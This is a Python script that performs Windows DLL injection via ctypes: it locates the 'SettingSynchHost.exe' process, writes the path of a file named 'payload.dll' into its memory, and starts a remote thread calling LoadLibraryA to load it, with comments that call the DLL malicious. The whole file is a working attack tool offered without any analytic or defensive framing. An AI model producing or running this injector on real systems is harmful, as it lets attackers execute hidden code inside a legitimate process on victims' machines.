import ctypes
import ctypes.wintypes
import os

# Define necessary constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
TH32CS_SNAPPROCESS = 0x00000002

# DLL to inject
malicious_dll_path = "payload.dll"

# Define the PROCESSENTRY32 structure
class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", ctypes.wintypes.DWORD),
        ("cntUsage", ctypes.wintypes.DWORD),
        ("th32ProcessID", ctypes.wintypes.DWORD),
        ("th32DefaultHeapID", ctypes.POINTER(ctypes.wintypes.ULONG)),
        ("th32ModuleID", ctypes.wintypes.DWORD),
        ("cntThreads", ctypes.wintypes.DWORD),
        ("th32ParentProcessID", ctypes.wintypes.DWORD),
        ("pcPriClassBase", ctypes.wintypes.LONG),
        ("dwFlags", ctypes.wintypes.DWORD),
        ("szExeFile", ctypes.c_char * ctypes.wintypes.MAX_PATH)
    ]

def get_process_id(process_name):
    """Get process ID by name."""
    # Create a snapshot of all processes
    h_process_snap = ctypes.windll.kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    pe32 = PROCESSENTRY32()
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)

    # Get the first process
    if not ctypes.windll.kernel32.Process32First(h_process_snap, ctypes.byref(pe32)):
        print("Failed to get first process.")
        return None

    # Loop through all processes to find the process by name
    while True:
        if pe32.szExeFile.decode('utf-8') == process_name:
            ctypes.windll.kernel32.CloseHandle(h_process_snap)
            return pe32.th32ProcessID
        if not ctypes.windll.kernel32.Process32Next(h_process_snap, ctypes.byref(pe32)):
            break

    # Close the handle to the snapshot
    ctypes.windll.kernel32.CloseHandle(h_process_snap)
    return None

def inject_dll(process_id, dll_path):
    """Inject a DLL into a running process."""
    # Open the target process
    h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
    if not h_process:
        print(f"Failed to open process {process_id}: {ctypes.windll.kernel32.GetLastError()}")
        return False

    # Allocate memory in the target process
    dll_path_bytes = dll_path.encode('utf-8')
    path_length = len(dll_path_bytes) + 1
    remote_memory = ctypes.windll.kernel32.VirtualAllocEx(h_process, None, path_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if not remote_memory:
        print(f"Failed to allocate memory in process {process_id}: {ctypes.windll.kernel32.GetLastError()}")
        return False

    # Write the DLL path into the allocated memory
    if not ctypes.windll.kernel32.WriteProcessMemory(h_process, remote_memory, dll_path_bytes, path_length, None):
        print(f"Failed to write to process memory: {ctypes.windll.kernel32.GetLastError()}")
        return False

    # Get the handle to kernel32.dll's LoadLibraryA function
    load_library_addr = ctypes.windll.kernel32.GetProcAddress(ctypes.windll.kernel32._handle, b'LoadLibraryA')

    # Create a remote thread to execute LoadLibraryA and load the malicious DLL
    h_thread = ctypes.windll.kernel32.CreateRemoteThread(h_process, None, 0, load_library_addr, remote_memory, 0, None)
    if not h_thread:
        print(f"Failed to create remote thread: {ctypes.windll.kernel32.GetLastError()}")
        return False

    print("DLL injected successfully!")

    # Clean up handles
    ctypes.windll.kernel32.CloseHandle(h_process)
    ctypes.windll.kernel32.CloseHandle(h_thread)
    return True

if __name__ == "__main__":
    # Find the process ID of SettingSynchHost.exe
    process_name = "SettingSynchHost.exe"
    process_id = get_process_id(process_name)

    if process_id:
        print(f"Found {process_name} with Process ID: {process_id}")
        if inject_dll(process_id, malicious_dll_path):
            print("Injection complete.")
        else:
            print("Injection failed.")
    else:
        print(f"{process_name} not found.")
